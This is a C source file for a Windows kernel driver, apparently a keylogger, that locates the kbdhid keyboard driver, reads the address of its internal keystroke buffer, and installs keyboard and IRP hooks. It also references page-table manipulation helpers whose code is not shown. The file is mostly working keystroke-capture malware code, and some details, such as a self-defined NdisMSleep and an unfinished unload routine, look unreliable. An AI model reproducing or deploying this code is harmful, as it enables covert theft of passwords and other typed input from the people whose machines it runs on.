#include <ntddk.h>
#include <wdf.h>  
#include <Driver.h>   
#include <ControlDevice.h>
#include <PageTableManipulation.h>
#include <KeyboardHooker.h>

PDEVICE_OBJECT usbBaseKeyboardDeviceObject;
DRIVER_INITIALIZE DriverEntry;
PULONG keyboardBuffer = NULL;
int numPendingIrps = 0;

_Use_decl_annotations_
NTSTATUS GetKeyboardMemoryBuffer(IN PDRIVER_OBJECT pDriverObject)
{
	//the filter device object   
	NTSTATUS status;
	POBJECT_TYPE driverObjectType;
	PDRIVER_OBJECT kbdHidDriverObject;
	UNICODE_STRING kbdHidDriverName;
	PrepHook(pDriverObject);

	// First, get the kbdhid driver
	RtlInitUnicodeString(&kbdHidDriverName, L"\\Driver\\kbdhid");
	driverObjectType = ObGetObjectType(pDriverObject);
	status = ObReferenceObjectByName(&kbdHidDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, driverObjectType, //(POBJECT_TYPE)IoDriverObjectType,
		KernelMode, NULL, (PVOID*)&kbdHidDriverObject);

	if (NT_SUCCESS(status)) {
		KdPrint(("kbdHidDriverObject is [0x%lx]\n", kbdHidDriverObject));
		usbBaseKeyboardDeviceObject = kbdHidDriverObject->DeviceObject;
		if (usbBaseKeyboardDeviceObject) {
			KdPrint(("usbBaseKeyboardDeviceObject is [0x%lx]\n", usbBaseKeyboardDeviceObject));
			PUSBK_EXT usbBaseDeviceExtension = (PUSBK_EXT)usbBaseKeyboardDeviceObject->DeviceExtension;
			KdPrint(("usbBaseDeviceExtension is [0x%lx]\n", usbBaseDeviceExtension));
			PUSBK_DATA dataPointer = usbBaseDeviceExtension->dataPointer;
			ULONG buffer = dataPointer->buffer;
			PULONG bufferAddress = &dataPointer->buffer;
			KdPrint(("bufferAddress is [0x%lx]\n", bufferAddress));
			keyboardBuffer = bufferAddress;

			KdPrint(("about to try to hook keyboard\n"));

			HookKeyboard(usbBaseKeyboardDeviceObject);

		}
	}
	return status;
}//end HookKeyboard   

_Use_decl_annotations_
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "KMDFCudaLogger: DriverEntry\n"));

	HookIrps(DriverObject);

	KdPrint(("Getting Keyboar dMemory Buffer\n"));
	status = GetKeyboardMemoryBuffer(DriverObject);

	// Set the DriverUnload procedure   
	KdPrint(("Set DriverUnload function pointer\n"));
	DriverObject->DriverUnload = Unload;

	KdPrint(("Creating Control Device\n"));
	status = CreateControlDevice( DriverObject,  RegistryPath);

	SetMajorFunction(DriverObject); // hk

	KdPrint(("Exiting Driver Entry\n"));

	return status;
}
 
 
_Use_decl_annotations_
VOID Unload(IN PDRIVER_OBJECT pDriverObject)
{
	KdPrint(("Unload IRQ Level [%u]", KeGetCurrentIrql()));
	
	// TODO: need to implement this
	KdPrint(("Removing Control Device...\n"));
	//RemoveControlDevice(pDriverObject);

	PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	DbgPrint("Keyboard hook detached from device...\n");

	if (numPendingIrps > 0) {
		KTIMER kTimer;
		LARGE_INTEGER  timeout;
		timeout.QuadPart = 1000000; //.1 s
		KeInitializeTimer(&kTimer);
		while (numPendingIrps > 0)
		{
			KeSetTimer(&kTimer, timeout, NULL);
			NdisMSleep(1000);
			KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);

		}
	}

	IoDeleteDevice(pDriverObject->DeviceObject);

	return;
}

VOID NdisMSleep(IN    ULONG    MicrosecondsToSleep)
{

	LARGE_INTEGER    TimerValue;
	KTIMER        SleepTimer;
	ASSERT(KeGetCurrentIrql() == LOW_LEVEL);
	KeInitializeTimerEx(&SleepTimer, SynchronizationTimer);
	TimerValue.QuadPart = Int32x32To64(MicrosecondsToSleep, -10);
	KeSetTimer(&SleepTimer, TimerValue, NULL);
	KeWaitForSingleObject(&SleepTimer, Executive, KernelMode, TRUE, NULL);

}
